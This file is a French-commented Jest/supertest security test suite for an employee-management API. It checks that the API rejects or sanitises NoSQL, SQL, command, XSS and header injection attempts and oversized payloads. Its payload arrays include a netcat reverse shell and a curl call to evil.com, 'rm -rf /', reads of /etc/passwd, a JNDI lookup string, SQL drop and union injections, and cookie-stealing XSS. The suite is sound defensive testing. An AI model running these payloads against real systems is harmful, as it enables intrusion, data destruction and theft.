import request from 'supertest';
import app from '../app';
import prisma from '../config/prisma';
import bcrypt from 'bcrypt';
import jwt from 'jsonwebtoken';

describe('Tests de sécurité contre les injections', () => {
  let adminUser: any;
  let adminToken: string;

  beforeEach(async () => {
    // Nettoyer avant chaque test
    await prisma.user.deleteMany({
      where: { email: 'admin@security.com' }
    });

    // Hasher le mot de passe manuellement
    const hashedPassword = await bcrypt.hash('password123', 10);

    adminUser = await prisma.user.create({
      data: {
        lastName: 'Admin',
        firstName: 'Security',
        email: 'admin@security.com',
        password: hashedPassword,
        role: 'admin'
      }
    });

    adminToken = jwt.sign(
      { user: { id: adminUser.id, email: adminUser.email, role: adminUser.role } },
      process.env.JWT_SECRET!,
      { expiresIn: '1h' }
    );
  });

  afterEach(async () => {
    // Nettoyer après chaque test
    await prisma.user.deleteMany({
      where: { email: 'admin@security.com' }
    });
  });

  describe('Protection contre l\'injection NoSQL', () => {
    it('devrait rejeter les tentatives d\'injection NoSQL dans le login', async () => {
      const injectionAttempts = [
        {
          email: { $ne: null },
          motDePasse: { $ne: null }
        },
        {
          email: { $gt: '' },
          motDePasse: 'password123'
        },
        {
          email: 'admin@security.com',
          motDePasse: { $regex: '.*' }
        },
        {
          email: { $where: 'this.email' },
          motDePasse: 'password123'
        },
        {
          email: 'admin@security.com',
          motDePasse: { $exists: true }
        }
      ];

      for (const payload of injectionAttempts) {
        const response = await request(app)
          .post('/api/auth/login')
          .send(payload);

        // Les tentatives d'injection devraient être rejetées
        expect(response.status).not.toBe(200);
        expect(response.status).toBe(400); // Validation error ou 401
      }
    });

    it('devrait rejeter les opérateurs MongoDB dans les paramètres de recherche', async () => {
      const injectionPayloads = [
        { email: { $ne: 'test@test.com' } },
        { role: { $in: ['admin', 'manager'] } },
        { $where: 'this.role === "admin"' },
        { $or: [{ role: 'admin' }, { role: 'manager' }] }
      ];

      for (const payload of injectionPayloads) {
        const response = await request(app)
          .get('/api/admin/employees')
          .query(payload)
          .set('Cookie', `token=${adminToken}`);

        // La requête devrait soit échouer soit ne pas retourner de données sensibles
        if (response.status === 200) {
          // Si la requête réussit, vérifier qu'elle ne retourne pas plus de données que prévu
          expect(Array.isArray(response.body)).toBe(true);
        }
      }
    });

    it('devrait valider et assainir les entrées utilisateur', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '{ "$ne": null }',
        'javascript:alert(1)',
        '${jndi:ldap://evil.com}',
        '../../../etc/passwd',
        'SELECT * FROM users',
        'DROP TABLE users;'
      ];

      for (const input of maliciousInputs) {
        const userData = {
          lastName: input,
          firstName: 'Test',
          email: 'test@security.com',
          role: 'employee'
        };

        const response = await request(app)
          .post('/api/admin/employees')
          .set('Cookie', `token=${adminToken}`)
          .send(userData);

        // Les entrées malicieuses devraient être rejetées ou assainies
        if (response.status === 200 || response.status === 201) {
          // Si l'utilisateur est créé, vérifier que l'input a été assaini
          expect(response.body.lastName).not.toBe(input);
        }
      }
    });
  });

  describe('Protection contre l\'injection SQL (si applicable)', () => {
    it('devrait rejeter les tentatives d\'injection SQL dans les paramètres', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES ('hacker', 'admin'); --",
        "' OR 1=1 --"
      ];

      for (const injection of sqlInjectionAttempts) {
        const response = await request(app)
          .get('/api/admin/employees')
          .query({ search: injection })
          .set('Cookie', `token=${adminToken}`);

        // Les tentatives d'injection ne devraient pas causer d'erreur de base de données
        expect(response.status).not.toBe(500);
      }
    });
  });

  describe('Protection contre l\'injection de commandes', () => {
    it('devrait rejeter les tentatives d\'injection de commandes système', async () => {
      const commandInjections = [
        '; ls -la',
        '| cat /etc/passwd',
        '&& rm -rf /',
        '$(whoami)',
        '`id`',
        '; curl http://evil.com',
        '| nc -e /bin/sh evil.com 4444'
      ];

      for (const injection of commandInjections) {
        const userData = {
          lastName: `Test${injection}`,
          firstName: 'User',
          email: 'test@security.com',
          role: 'employee'
        };

        const response = await request(app)
          .post('/api/admin/employees')
          .set('Cookie', `token=${adminToken}`)
          .send(userData);

        // Les commandes ne devraient pas être exécutées
        expect(response.status).not.toBe(500);
      }
    });
  });

  describe('Protection contre les attaques XSS', () => {
    it('devrait échapper ou rejeter les scripts malicieux', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        'javascript:alert(document.cookie)',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload="alert(1)">',
        '<input type="text" value="" onfocus="alert(1)" autofocus>'
      ];

      for (const payload of xssPayloads) {
        const userData = {
          lastName: payload,
          firstName: 'Test',
          email: 'xss-test@security.com',
          role: 'employee'
        };

        const response = await request(app)
          .post('/api/admin/employees')
          .set('Cookie', `token=${adminToken}`)
          .send(userData);

        if (response.status === 200 || response.status === 201) {
          // Vérifier que le script a été échappé ou rejeté
          const responseText = JSON.stringify(response.body);
          expect(responseText).not.toMatch(/<script/i);
          expect(responseText).not.toMatch(/onerror/i);
          expect(responseText).not.toMatch(/onload/i);
          expect(responseText).not.toMatch(/javascript:/i);
        }
      }
    });

    it('devrait valider les en-têtes HTTP pour prévenir l\'injection d\'en-têtes', async () => {
      const maliciousHeaders = [
        'test\r\nSet-Cookie: admin=true',
        'test\nLocation: http://evil.com',
        'test\r\nX-Admin: true',
        'test%0d%0aSet-Cookie:%20admin=true'
      ];

      for (const header of maliciousHeaders) {
        const response = await request(app)
          .get('/api/profile')
          .set('User-Agent', header)
          .set('Cookie', `token=${adminToken}`);

        // Vérifier qu'aucun en-tête malicieux n'a été injecté
        expect(response.headers['set-cookie']).not.toMatch(/admin=true/);
        expect(response.headers['location']).not.toMatch(/evil\.com/);
        expect(response.headers['x-admin']).toBeUndefined();
      }
    });
  });

  describe('Validation des types de données', () => {
    it('devrait rejeter les types de données inattendus', async () => {
      const invalidDataTypes = [
        { nom: 123 }, // nombre au lieu de string
        { nom: ['array', 'instead', 'of', 'string'] },
        { nom: { object: 'instead of string' } },
        { nom: true }, // boolean au lieu de string
        { role: 123 }, // nombre au lieu de string pour le rôle
        { email: null },
        { email: undefined }
      ];

      for (const invalidData of invalidDataTypes) {
        const userData = {
          lastName: 'Test',
          firstName: 'User',
          email: 'test@security.com',
          role: 'employee',
          ...invalidData
        };

        const response = await request(app)
          .post('/api/admin/employees')
          .set('Cookie', `token=${adminToken}`)
          .send(userData);

        // Les types invalides devraient être rejetés
        expect(response.status).toBe(400);
      }
    });

    it('devrait valider les formats d\'email', async () => {
      const invalidEmails = [
        'not-an-email',
        '@domain.com',
        'user@',
        'user..double.dot@domain.com',
        'user@domain',
        '<script>alert(1)</script>@domain.com',
        'user@domain.com<script>alert(1)</script>'
      ];

      for (const email of invalidEmails) {
        const userData = {
          lastName: 'Test',
          firstName: 'User',
          email: email,
          role: 'employee'
        };

        const response = await request(app)
          .post('/api/admin/employees')
          .set('Cookie', `token=${adminToken}`)
          .send(userData);

        // Les emails invalides devraient être rejetés
        expect(response.status).toBe(400);
      }
    });
  });

  describe('Protection contre les attaques par déni de service (DoS)', () => {
    it('devrait gérer les requêtes avec des payloads très volumineux', async () => {
      const largeString = 'A'.repeat(1000000); // 1MB de données
      
      const userData = {
        lastName: largeString,
        firstName: 'Test',
        email: 'test@security.com',
        role: 'employee'
      };

      const response = await request(app)
        .post('/api/admin/employees')
        .set('Cookie', `token=${adminToken}`)
        .send(userData);

      // La requête devrait être rejetée ou gérée gracieusement
      expect(response.status).not.toBe(500);
      if (response.status !== 413) { // 413 = Payload Too Large
        expect(response.status).toBe(400);
      }
    });

    it('devrait limiter la profondeur des objets imbriqués', async () => {
      // Créer un objet profondément imbriqué
      let deepObject: any = { value: 'test' };
      for (let i = 0; i < 100; i++) {
        deepObject = { nested: deepObject };
      }

      const userData = {
        lastName: 'Test',
        firstName: 'User',
        email: 'test@security.com',
        role: 'employee',
        metadata: deepObject
      };

      const response = await request(app)
        .post('/api/admin/employees')
        .set('Cookie', `token=${adminToken}`)
        .send(userData);

      // Les objets trop profonds devraient être rejetés
      expect(response.status).not.toBe(500);
    });
  });
});